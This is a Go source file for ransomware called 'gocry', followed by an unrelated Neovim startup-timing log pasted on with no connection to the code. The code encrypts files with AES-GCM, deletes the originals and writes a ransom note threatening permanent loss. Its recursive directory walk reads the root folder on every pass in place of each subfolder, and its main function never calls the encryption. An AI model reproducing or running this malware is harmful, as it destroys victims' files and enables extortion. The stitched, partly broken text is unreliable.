package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/ioutil"
	"log"
	"os"

	"github.com/joho/godotenv"
	"github.com/nireo/gocry/utils"
	"golang.org/x/exp/errors/fmt"
)

const message string = `
Hello, you've been infected by gocry. Your files have been encrypted using military grade encryption >:D.
Do not use any decryption software or change the files, otherwise they might be lost forever.

How to decrypt:
Run the decrypt_files providing the key file with the right key!
`

// Ransomware holds all the values and functions needed to operate the ransomware.
type Ransomware struct {
	key       []byte
	publicKey string
	rootDir   string
	publicIP  string
}

// GenNewKey creates a random 32-bit key using the std crypto library.
func (rw *Ransomware) GenNewKey() error {
	key, err := utils.Gen32BitKey()
	if err != nil {
		log.Fatal(err)
	}

	rw.key = key
	return nil
}

// encrypts a file at a given path using the given ransomware key. also adds the .gocry extension
func (rw *Ransomware) encryptSingleFile(path string) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		log.Fatal(err)
	}

	block, _ := aes.NewCipher(rw.key)
	gcm, err := cipher.NewGCM(block)

	if err != nil {
		log.Fatal(err.Error())
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		log.Fatal(err.Error())
	}

	if err := ioutil.WriteFile(path+".gocry", gcm.Seal(nonce, nonce, data, nil), 0666); err != nil {
		log.Fatal(err)
	}

	if err := os.Remove(path); err != nil {
		log.Fatal(err)
	}
}

func (rw *Ransomware) decryptSingleFile(path string) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		log.Fatal(err)
	}

	block, err := aes.NewCipher(rw.key)
	if err != nil {
		log.Fatal(err.Error())
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal(err.Error())
	}

	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		log.Fatal(err.Error())
	}

	// path[:len(path)-6] removes the .gocry extension from the filename -> test.png.gocry -> test.png
	if err := ioutil.WriteFile(path[:len(path)-6], plaintext, 0666); err != nil {
		log.Fatal(err)
	}

	if err := os.Remove(path); err != nil {
		log.Fatal(err)
	}
}

// This function is used recursively to encrypt all the subdirectories, and the files
// in those directores
func (rw *Ransomware) encryptDirectory(path string) {
	files, err := ioutil.ReadDir(rw.rootDir)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.IsDir() {
			rw.encryptDirectory(path + "/" + f.Name())
		} else {
			rw.encryptSingleFile(path + "/" + f.Name())
		}
	}
}

// This function is used recursively to decrypt all the subdirectories, and the files
// in those directores
func (rw *Ransomware) decryptDirectory(path string) {
	files, err := ioutil.ReadDir(rw.rootDir)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.IsDir() {
			rw.decryptDirectory(path + "/" + f.Name())
		} else {
			rw.decryptSingleFile(path + "/" + f.Name())
		}
	}
}

func main() {
	if err := godotenv.Load(); err != nil {
		log.Fatal(err)
	}

	ransomware := &Ransomware{}
	ransomware.GenNewKey()
	ransomware.rootDir = os.Getenv("root_dir")

	// Create the message file
	file, err := os.Create(ransomware.rootDir + "/ransom.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	if _, err := file.WriteString(message); err != nil {
		log.Fatal(err)
	}

	fmt.Println(string(ransomware.key))
}


times in msec
 clock   self+sourced   self:  sourced script
 clock   elapsed:              other lines

000.003  000.003: --- NVIM STARTING ---
000.204  000.201: locale set
000.382  000.178: inits 1
000.391  000.009: window checked
000.394  000.002: parsing arguments
000.425  000.031: expanding arguments
000.453  000.028: inits 2
000.820  000.367: init highlight
000.879  000.059: waiting for UI
001.566  000.687: done waiting for UI
001.585  000.019: initialized screen early for UI
001.648  000.012  000.012: sourcing /usr/share/nvim/archlinux.vim
001.654  000.043  000.031: sourcing /etc/xdg//nvim/sysinit.vim
002.966  001.245  001.245: sourcing /home/eemil/.local/share/nvim/site/autoload/plug.vim
010.916  000.015  000.015: sourcing /home/eemil/.vim/plugged/vimtex/ftdetect/tex.vim
011.092  000.143  000.143: sourcing /home/eemil/.vim/plugged/vim-go/ftdetect/gofiletype.vim
011.219  000.010  000.010: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/css.vim
011.239  000.010  000.010: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/graphql.vim
011.256  000.009  000.009: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/html.vim
011.273  000.008  000.008: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/javascript.vim
011.289  000.007  000.007: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/json.vim
011.308  000.009  000.009: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/less.vim
011.324  000.007  000.007: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/lua.vim
011.348  000.015  000.015: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/markdown.vim
011.365  000.007  000.007: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/php.vim
011.382  000.007  000.007: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/ruby.vim
011.406  000.015  000.015: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/scss.vim
011.426  000.011  000.011: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/typescript.vim
011.443  000.008  000.008: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/vue.vim
011.459  000.007  000.007: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/xml.vim
011.478  000.009  000.009: sourcing /home/eemil/.vim/plugged/vim-prettier/ftdetect/yaml.vim
011.518  000.008  000.008: sourcing /home/eemil/.vim/plugged/yats.vim/ftdetect/typescript.vim
011.535  000.007  000.007: sourcing /home/eemil/.vim/plugged/yats.vim/ftdetect/typescriptreact.vim
011.571  000.011  000.011: sourcing /home/eemil/.vim/plugged/typescript-vim/ftdetect/typescript.vim
011.620  000.021  000.021: sourcing /home/eemil/.vim/plugged/rust.vim/ftdetect/rust.vim
011.697  005.409  005.068: sourcing /usr/share/nvim/runtime/filetype.vim
011.793  000.021  000.021: sourcing /usr/share/nvim/runtime/ftplugin.vim
011.884  000.019  000.019: sourcing /usr/share/nvim/runtime/indent.vim
012.240  000.177  000.177: sourcing /usr/share/nvim/runtime/syntax/syncolor.vim
012.309  000.317  000.140: sourcing /usr/share/nvim/runtime/syntax/synload.vim
012.326  000.407  000.090: sourcing /usr/share/nvim/runtime/syntax/syntax.vim
012.398  000.007  000.007: sourcing /usr/share/nvim/runtime/filetype.vim
012.471  000.005  000.005: sourcing /usr/share/nvim/runtime/ftplugin.vim
012.542  000.005  000.005: sourcing /usr/share/nvim/runtime/indent.vim
012.722  000.152  000.152: sourcing /usr/share/nvim/runtime/syntax/nosyntax.vim
014.307  000.110  000.110: sourcing /usr/share/nvim/runtime/syntax/syncolor.vim
015.054  002.010  001.900: sourcing /home/eemil/.vim/plugged/vim-monotone/colors/monotone.vim
015.530  013.857  004.577: sourcing /home/eemil/.config/nvim/init.vim
015.534  000.049: sourcing vimrc file(s)
015.755  000.053  000.053: sourcing /home/eemil/.vim/plugged/coc.nvim/autoload/coc/rpc.vim
016.164  000.376  000.376: sourcing /home/eemil/.vim/plugged/coc.nvim/autoload/coc/util.vim
016.379  000.102  000.102: sourcing /home/eemil/.vim/plugged/coc.nvim/autoload/coc/client.vim
019.131  003.506  002.975: sourcing /home/eemil/.vim/plugged/coc.nvim/plugin/coc.vim
019.432  000.095  000.095: sourcing /home/eemil/.vim/plugged/vim-gitgutter/autoload/gitgutter/utility.vim
019.657  000.079  000.079: sourcing /home/eemil/.vim/plugged/vim-gitgutter/autoload/gitgutter/highlight.vim
020.599  001.373  001.199: sourcing /home/eemil/.vim/plugged/vim-gitgutter/plugin/gitgutter.vim
020.926  000.272  000.272: sourcing /home/eemil/.vim/plugged/vim-rooter/plugin/rooter.vim
021.368  000.393  000.393: sourcing /home/eemil/.vim/plugged/fzf/plugin/fzf.vim
021.945  000.524  000.524: sourcing /home/eemil/.vim/plugged/fzf.vim/plugin/fzf.vim
024.680  002.683  002.683: sourcing /home/eemil/.vim/plugged/nerdcommenter/plugin/NERD_commenter.vim
025.040  000.282  000.282: sourcing /home/eemil/.vim/plugged/vim-clang-format/plugin/clang_format.vim
025.431  000.253  000.253: sourcing /home/eemil/.vim/plugged/vim-go/autoload/go/config.vim
025.898  000.232  000.232: sourcing /home/eemil/.vim/plugged/vim-go/autoload/go/util.vim
025.920  000.823  000.338: sourcing /home/eemil/.vim/plugged/vim-go/plugin/go.vim
026.204  000.233  000.233: sourcing /home/eemil/.vim/plugged/vim-prettier/plugin/prettier.vim
026.321  000.048  000.048: sourcing /home/eemil/.vim/plugged/rust.vim/plugin/cargo.vim
026.358  000.024  000.024: sourcing /home/eemil/.vim/plugged/rust.vim/plugin/rust.vim
026.674  000.137  000.137: sourcing /usr/share/nvim/runtime/plugin/gzip.vim
026.705  000.008  000.008: sourcing /usr/share/nvim/runtime/plugin/health.vim
026.776  000.058  000.058: sourcing /usr/share/nvim/runtime/plugin/man.vim
027.193  000.181  000.181: sourcing /usr/share/nvim/runtime/pack/dist/opt/matchit/plugin/matchit.vim
027.221  000.431  000.250: sourcing /usr/share/nvim/runtime/plugin/matchit.vim
027.243  000.010  000.010: sourcing /usr/share/nvim/runtime/plugin/matchparen.vim
027.593  000.339  000.339: sourcing /usr/share/nvim/runtime/plugin/netrwPlugin.vim
027.718  000.101  000.101: sourcing /usr/share/nvim/runtime/plugin/rplugin.vim
027.870  000.132  000.132: sourcing /usr/share/nvim/runtime/plugin/shada.vim
027.927  000.022  000.022: sourcing /usr/share/nvim/runtime/plugin/spellfile.vim
028.063  000.117  000.117: sourcing /usr/share/nvim/runtime/plugin/tarPlugin.vim
028.142  000.060  000.060: sourcing /usr/share/nvim/runtime/plugin/tohtml.vim
028.175  000.015  000.015: sourcing /usr/share/nvim/runtime/plugin/tutor.vim
028.315  000.124  000.124: sourcing /usr/share/nvim/runtime/plugin/zipPlugin.vim
028.333  001.082: loading plugins
028.377  000.043: loading packages
028.422  000.046: loading after plugins
028.438  000.016: inits 3
029.970  001.531: reading ShaDa
030.188  000.218: opening buffers
030.390  000.161  000.161: sourcing /home/eemil/.vim/plugged/vim-gitgutter/autoload/gitgutter.vim
030.778  000.430: BufEnter autocommands
030.781  000.003: editing files in windows
030.918  000.136: VimEnter autocommands
030.920  000.002: UIEnter autocommands
031.233  000.231  000.231: sourcing /usr/share/nvim/runtime/autoload/provider/clipboard.vim
031.239  000.088: before starting main loop
032.263  000.998  000.998: sourcing /home/eemil/.vim/plugged/coc.nvim/autoload/coc/float.vim
041.140  008.903: first screen update
041.145  000.005: --- NVIM STARTED ---
